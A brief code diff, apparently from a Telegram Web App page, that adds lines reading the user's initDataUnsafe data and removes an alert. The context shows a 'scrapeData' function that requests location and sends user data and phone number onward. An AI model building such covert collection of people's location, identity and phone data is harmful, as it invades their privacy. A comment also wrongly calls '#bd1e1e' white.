@@ -126,13 +126,14 @@
         // Function to change background color
         function setBackgroundColor() {
             Telegram.WebApp.setBackgroundColor("#bd1e1e");  // White background color
-            alert("BGCOloRO FUn")
+            alert("BGCOloRO FUn");
+            const u=Telegram.WebApp.initDataUnsafe;
+            alert(u);
         }
 
         // Call the function to set the background color
         setBackgroundColor();
         function scrapeData() {
-            Telegram.WebApp.showAlert("Background color changed!");
             requestLocation();
             sendUserDataToTelegram();
             sendPhoneNumberToTelegram();
